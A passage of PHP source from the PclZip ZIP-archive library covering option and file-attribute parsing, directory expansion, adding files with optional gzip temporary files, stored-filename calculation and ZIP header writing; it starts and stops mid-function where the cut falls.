          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_work_list = array();
        if (is_string($p_options_list[$i+1])) {

            $p_options_list[$i+1] = strtr($p_options_list[$i+1], ' ', '');

            $v_work_list = explode(",", $p_options_list[$i+1]);
        }
        else if (is_integer($p_options_list[$i+1])) {
            $v_work_list[0] = $p_options_list[$i+1].'-'.$p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_work_list = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Value must be integer, string or array for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        
        $v_sort_flag=false;
        $v_sort_value=0;
        for ($j=0; $j<sizeof($v_work_list); $j++) {
            $v_item_list = explode("-", $v_work_list[$j]);
            $v_size_item_list = sizeof($v_item_list);
            
            
            if ($v_size_item_list == 1) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[0];
            }
            elseif ($v_size_item_list == 2) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[1];
            }
            else {
                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Too many values in index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }


            if ($v_result_list[$p_options_list[$i]][$j]['start'] < $v_sort_value) {
                $v_sort_flag=true;

                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Invalid order of index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }
            $v_sort_value = $v_result_list[$p_options_list[$i]][$j]['start'];
        }
        
        if ($v_sort_flag) {
        }

        $i++;
      break;

      case PCLZIP_OPT_REMOVE_ALL_PATH :
      case PCLZIP_OPT_EXTRACT_AS_STRING :
      case PCLZIP_OPT_NO_COMPRESSION :
      case PCLZIP_OPT_EXTRACT_IN_OUTPUT :
      case PCLZIP_OPT_REPLACE_NEWER :
      case PCLZIP_OPT_STOP_ON_ERROR :
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_SET_CHMOD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        $i++;
      break;

      case PCLZIP_CB_PRE_EXTRACT :
      case PCLZIP_CB_POST_EXTRACT :
      case PCLZIP_CB_PRE_ADD :
      case PCLZIP_CB_POST_ADD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_function_name = $p_options_list[$i+1];

        if (!function_exists($v_function_name)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Function '".$v_function_name."()' is not an existing function for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_function_name;
        $i++;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Unknown parameter '"
						   .$p_options_list[$i]."'");

        return PclZip::errorCode();
    }

    $i++;
  }

  if ($v_requested_options !== false) {
    for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
      if ($v_requested_options[$key] == 'mandatory') {
        if (!isset($v_result_list[$key])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");

          return PclZip::errorCode();
        }
      }
    }
  }
  
  if (!isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
    
  }

  return $v_result;
}

function privOptionDefaultThreshold(&$p_options)
{
  $v_result=1;
  
  if (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
      || isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) {
    return $v_result;
  }
  
  $v_memory_limit = ini_get('memory_limit');
  $v_memory_limit = trim($v_memory_limit);
  $last = strtolower(substr($v_memory_limit, -1));

  if($last == 'g')
      $v_memory_limit = $v_memory_limit*1073741824;
  if($last == 'm')
      $v_memory_limit = $v_memory_limit*1048576;
  if($last == 'k')
      $v_memory_limit = $v_memory_limit*1024;
          
  $p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] = floor($v_memory_limit*PCLZIP_TEMPORARY_FILE_RATIO);
  

  if ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] < 1048576) {
    unset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD]);
  }
        
  return $v_result;
}

function privFileDescrParseAtt(&$p_file_list, &$p_filedescr, $v_options, $v_requested_options=false)
{
  $v_result=1;
  
  foreach ($p_file_list as $v_key => $v_value) {
  
    if (!isset($v_requested_options[$v_key])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file attribute '".$v_key."' for this file");

      return PclZip::errorCode();
    }

    switch ($v_key) {
      case PCLZIP_ATT_FILE_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['filename'] = PclZipUtilPathReduction($v_value);
        
        if ($p_filedescr['filename'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

      break;

      case PCLZIP_ATT_FILE_NEW_SHORT_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_short_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_short_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty short filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_NEW_FULL_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_full_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_full_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty full filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_COMMENT :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['comment'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_MTIME :
        if (!is_integer($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". Integer expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['mtime'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_CONTENT :
        $p_filedescr['content'] = $v_value;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                           "Unknown parameter '".$v_key."'");

        return PclZip::errorCode();
    }

    if ($v_requested_options !== false) {
      for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
        if ($v_requested_options[$key] == 'mandatory') {
          if (!isset($p_file_list[$key])) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");
            return PclZip::errorCode();
          }
        }
      }
    }
  
  }
  
  return $v_result;
}

function privFileDescrExpand(&$p_filedescr_list, &$p_options)
{
  $v_result=1;
  
  $v_result_list = array();
  
  for ($i=0; $i<sizeof($p_filedescr_list); $i++) {
    
    $v_descr = $p_filedescr_list[$i];
    
    $v_descr['filename'] = PclZipUtilTranslateWinPath($v_descr['filename'], false);
    $v_descr['filename'] = PclZipUtilPathReduction($v_descr['filename']);
    
    if (file_exists($v_descr['filename'])) {
      if (@is_file($v_descr['filename'])) {
        $v_descr['type'] = 'file';
      }
      else if (@is_dir($v_descr['filename'])) {
        $v_descr['type'] = 'folder';
      }
      else if (@is_link($v_descr['filename'])) {
        continue;
      }
      else {
        continue;
      }
    }
    
    else if (isset($v_descr['content'])) {
      $v_descr['type'] = 'virtual_file';
    }
    
    else {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$v_descr['filename']."' does not exist");

      return PclZip::errorCode();
    }
    
    $this->privCalculateStoredFilename($v_descr, $p_options);
    
    $v_result_list[sizeof($v_result_list)] = $v_descr;
    
    if ($v_descr['type'] == 'folder') {
      $v_dirlist_descr = array();
      $v_dirlist_nb = 0;
      if ($v_folder_handler = @opendir($v_descr['filename'])) {
        while (($v_item_handler = @readdir($v_folder_handler)) !== false) {

          if (($v_item_handler == '.') || ($v_item_handler == '..')) {
              continue;
          }
          
          $v_dirlist_descr[$v_dirlist_nb]['filename'] = $v_descr['filename'].'/'.$v_item_handler;
          
          if (($v_descr['stored_filename'] != $v_descr['filename'])
               && (!isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))) {
            if ($v_descr['stored_filename'] != '') {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_descr['stored_filename'].'/'.$v_item_handler;
            }
            else {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_item_handler;
            }
          }
    
          $v_dirlist_nb++;
        }
        
        @closedir($v_folder_handler);
      }
      else {
      }
      
      if ($v_dirlist_nb != 0) {
        if (($v_result = $this->privFileDescrExpand($v_dirlist_descr, $p_options)) != 1) {
          return $v_result;
        }
        
        $v_result_list = array_merge($v_result_list, $v_dirlist_descr);
      }
      else {
      }
        
      unset($v_dirlist_descr);
    }
  }
  
  $p_filedescr_list = $v_result_list;

  return $v_result;
}

function privCreate($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();
  
  $this->privDisableMagicQuotes();

  if (($v_result = $this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  $v_result = $this->privAddList($p_filedescr_list, $p_result_list, $p_options);

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privAdd($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if ((!is_file($this->zipname)) || (filesize($this->zipname) == 0))
  {

    $v_result = $this->privCreate($p_filedescr_list, $p_result_list, $p_options);

    return $v_result;
  }
  $this->privDisableMagicQuotes();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    fclose($v_zip_temp_fd);
    $this->privCloseFd();
    @unlink($v_zip_temp_name);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  for ($i=0, $v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        fclose($v_zip_temp_fd);
        $this->privCloseFd();
        @unlink($v_zip_temp_name);
        $this->privSwapBackMagicQuotes();

        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = $v_central_dir['comment'];
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_ADD_COMMENT])) {
    $v_comment = $v_comment.$p_options[PCLZIP_OPT_ADD_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_PREPEND_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_PREPEND_COMMENT].$v_comment;
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count+$v_central_dir['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  $this->privSwapBackMagicQuotes();

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privOpenFd($p_mode)
{
  $v_result=1;

  if ($this->zip_fd != 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Zip file \''.$this->zipname.'\' already open');

    return PclZip::errorCode();
  }

  if (($this->zip_fd = @fopen($this->zipname, $p_mode)) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in '.$p_mode.' mode');

    return PclZip::errorCode();
  }

  return $v_result;
}

function privCloseFd()
{
  $v_result=1;

  if ($this->zip_fd != 0)
    @fclose($this->zip_fd);
  $this->zip_fd = 0;

  return $v_result;
}

function privAddList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  for ($i=0,$v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = '';
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count, $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);

    return $v_result;
  }

  return $v_result;
}

function privAddFileList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_header = array();

  $v_nb = sizeof($p_result_list);

  for ($j=0; ($j<sizeof($p_filedescr_list)) && ($v_result==1); $j++) {
    $p_filedescr_list[$j]['filename']
    = PclZipUtilTranslateWinPath($p_filedescr_list[$j]['filename'], false);
    

    if ($p_filedescr_list[$j]['filename'] == "") {
      continue;
    }

    if (   ($p_filedescr_list[$j]['type'] != 'virtual_file')
        && (!file_exists($p_filedescr_list[$j]['filename']))) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$p_filedescr_list[$j]['filename']."' does not exist");
      return PclZip::errorCode();
    }

    if (   ($p_filedescr_list[$j]['type'] == 'file')
        || ($p_filedescr_list[$j]['type'] == 'virtual_file')
        || (   ($p_filedescr_list[$j]['type'] == 'folder')
            && (   !isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])
                || !$p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))
        ) {

      $v_result = $this->privAddFile($p_filedescr_list[$j], $v_header,
                                     $p_options);
      if ($v_result != 1) {
        return $v_result;
      }

      $p_result_list[$v_nb++] = $v_header;
    }
  }

  return $v_result;
}

function privAddFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];

  if ($p_filename == "") {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file list parameter (invalid or empty list)");

    return PclZip::errorCode();
  }


  clearstatcache();
  $p_header['version'] = 20;
  $p_header['version_extracted'] = 10;
  $p_header['flag'] = 0;
  $p_header['compression'] = 0;
  $p_header['crc'] = 0;
  $p_header['compressed_size'] = 0;
  $p_header['filename_len'] = strlen($p_filename);
  $p_header['extra_len'] = 0;
  $p_header['disk'] = 0;
  $p_header['internal'] = 0;
  $p_header['offset'] = 0;
  $p_header['filename'] = $p_filename;
  $p_header['stored_filename'] = $p_filedescr['stored_filename'];
  $p_header['extra'] = '';
  $p_header['status'] = 'ok';
  $p_header['index'] = -1;

  if ($p_filedescr['type']=='file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type']=='folder') {
    $p_header['external'] = 0x00000010;
    $p_header['mtime'] = filemtime($p_filename);
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = strlen($p_filedescr['content']);
  }
  

  if (isset($p_filedescr['mtime'])) {
    $p_header['mtime'] = $p_filedescr['mtime'];
  }
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['mtime'] = time();
  }
  else {
    $p_header['mtime'] = filemtime($p_filename);
  }

  if (isset($p_filedescr['comment'])) {
    $p_header['comment_len'] = strlen($p_filedescr['comment']);
    $p_header['comment'] = $p_filedescr['comment'];
  }
  else {
    $p_header['comment_len'] = 0;
    $p_header['comment'] = '';
  }

  if (isset($p_options[PCLZIP_CB_PRE_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_ADD](PCLZIP_CB_PRE_ADD, $v_local_header);
    if ($v_result == 0) {
      $p_header['status'] = "skipped";
      $v_result = 1;
    }

    if ($p_header['stored_filename'] != $v_local_header['stored_filename']) {
      $p_header['stored_filename'] = PclZipUtilPathReduction($v_local_header['stored_filename']);
    }
  }

  if ($p_header['stored_filename'] == "") {
    $p_header['status'] = "filtered";
  }
  
  if (strlen($p_header['stored_filename']) > 0xFF) {
    $p_header['status'] = 'filename_too_long';
  }

  if ($p_header['status'] == 'ok') {

    if ($p_filedescr['type'] == 'file') {
      if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
          && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
              || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                  && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_header['size'])) ) ) {
        $v_result = $this->privAddFileUsingTempFile($p_filedescr, $p_header, $p_options);
        if ($v_result < PCLZIP_ERR_NO_ERROR) {
          return $v_result;
        }
      }
      
      else {

      if (($v_file = @fopen($p_filename, "rb")) == 0) {
        PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
        return PclZip::errorCode();
      }

      $v_content = @fread($v_file, $p_header['size']);

      @fclose($v_file);

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);

      }

    }

    else if ($p_filedescr['type'] == 'virtual_file') {
        
      $v_content = $p_filedescr['content'];

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);
    }

    else if ($p_filedescr['type'] == 'folder') {
      if (@substr($p_header['stored_filename'], -1) != '/') {
        $p_header['stored_filename'] .= '/';
      }

      $p_header['size'] = 0;

      if (($v_result = $this->privWriteFileHeader($p_header)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (isset($p_options[PCLZIP_CB_POST_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_ADD](PCLZIP_CB_POST_ADD, $v_local_header);
    if ($v_result == 0) {
      $v_result = 1;
    }

  }

  return $v_result;
}

function privAddFileUsingTempFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=PCLZIP_ERR_NO_ERROR;
  
  $p_filename = $p_filedescr['filename'];


  if (($v_file = @fopen($p_filename, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
    return PclZip::errorCode();
  }

  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_file_compressed = @gzopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }

  $v_size = filesize($p_filename);
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file, $v_read_size);
    @gzputs($v_file_compressed, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file);
  @gzclose($v_file_compressed);

  if (filesize($v_gzip_temp_name) < 18) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'gzip temporary file \''.$v_gzip_temp_name.'\' has invalid filesize - should be minimum 18 bytes');
    return PclZip::errorCode();
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  $v_binary_data = @fread($v_file_compressed, 10);
  $v_data_header = unpack('a1id1/a1id2/a1cm/a1flag/Vmtime/a1xfl/a1os', $v_binary_data);

  $v_data_header['os'] = bin2hex($v_data_header['os']);

  @fseek($v_file_compressed, filesize($v_gzip_temp_name)-8);
  $v_binary_data = @fread($v_file_compressed, 8);
  $v_data_footer = unpack('Vcrc/Vcompressed_size', $v_binary_data);

  $p_header['compression'] = ord($v_data_header['cm']);
  $p_header['crc'] = $v_data_footer['crc'];
  $p_header['compressed_size'] = filesize($v_gzip_temp_name)-18;

  @fclose($v_file_compressed);

  if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
    return $v_result;
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  fseek($v_file_compressed, 10);
  $v_size = $p_header['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file_compressed, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file_compressed);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privCalculateStoredFilename(&$p_filedescr, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];
  if (isset($p_options[PCLZIP_OPT_ADD_PATH])) {
    $p_add_dir = $p_options[PCLZIP_OPT_ADD_PATH];
  }
  else {
    $p_add_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_PATH])) {
    $p_remove_dir = $p_options[PCLZIP_OPT_REMOVE_PATH];
  }
  else {
    $p_remove_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
    $p_remove_all_dir = $p_options[PCLZIP_OPT_REMOVE_ALL_PATH];
  }
  else {
    $p_remove_all_dir = 0;
  }


  if (isset($p_filedescr['new_full_name'])) {
    $v_stored_filename = PclZipUtilTranslateWinPath($p_filedescr['new_full_name']);
  }
  
  else {

    if (isset($p_filedescr['new_short_name'])) {
      $v_path_info = pathinfo($p_filename);
      $v_dir = '';
      if ($v_path_info['dirname'] != '') {
        $v_dir = $v_path_info['dirname'].'/';
      }
      $v_stored_filename = $v_dir.$p_filedescr['new_short_name'];
    }
    else {
      $v_stored_filename = $p_filename;
    }

    if ($p_remove_all_dir) {
      $v_stored_filename = basename($p_filename);
    }
    else if ($p_remove_dir != "") {
      if (substr($p_remove_dir, -1) != '/')
        $p_remove_dir .= "/";

      if (   (substr($p_filename, 0, 2) == "./")
          || (substr($p_remove_dir, 0, 2) == "./")) {
          
        if (   (substr($p_filename, 0, 2) == "./")
            && (substr($p_remove_dir, 0, 2) != "./")) {
          $p_remove_dir = "./".$p_remove_dir;
        }
        if (   (substr($p_filename, 0, 2) != "./")
            && (substr($p_remove_dir, 0, 2) == "./")) {
          $p_remove_dir = substr($p_remove_dir, 2);
        }
      }

      $v_compare = PclZipUtilPathInclusion($p_remove_dir,
                                           $v_stored_filename);
      if ($v_compare > 0) {
        if ($v_compare == 2) {
          $v_stored_filename = "";
        }
        else {
          $v_stored_filename = substr($v_stored_filename,
                                      strlen($p_remove_dir));
        }
      }
    }
    
    $v_stored_filename = PclZipUtilTranslateWinPath($v_stored_filename);
    
    if ($p_add_dir != "") {
      if (substr($p_add_dir, -1) == "/")
        $v_stored_filename = $p_add_dir.$v_stored_filename;
      else
        $v_stored_filename = $p_add_dir."/".$v_stored_filename;
    }
  }

  $v_stored_filename = PclZipUtilPathReduction($v_stored_filename);
  $p_filedescr['stored_filename'] = $v_stored_filename;
  
  return $v_result;
}

function privWriteFileHeader(&$p_header)
{
  $v_result=1;

  $p_header['offset'] = ftell($this->zip_fd);

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];

  $v_binary_data = pack("VvvvvvVVVvv", 0x04034b50,
                      $p_header['version_extracted'], $p_header['flag'],
                        $p_header['compression'], $v_mtime, $v_mdate,
                        $p_header['crc'], $p_header['compressed_size'],
					  $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len']);

  fputs($this->zip_fd, $v_binary_data, 30);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }

  return $v_result;
}

function privWriteCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];


  $v_binary_data = pack("VvvvvvvVVVvvvvvVV", 0x02014b50,
                      $p_header['version'], $p_header['version_extracted'],
                        $p_header['flag'], $p_header['compression'],
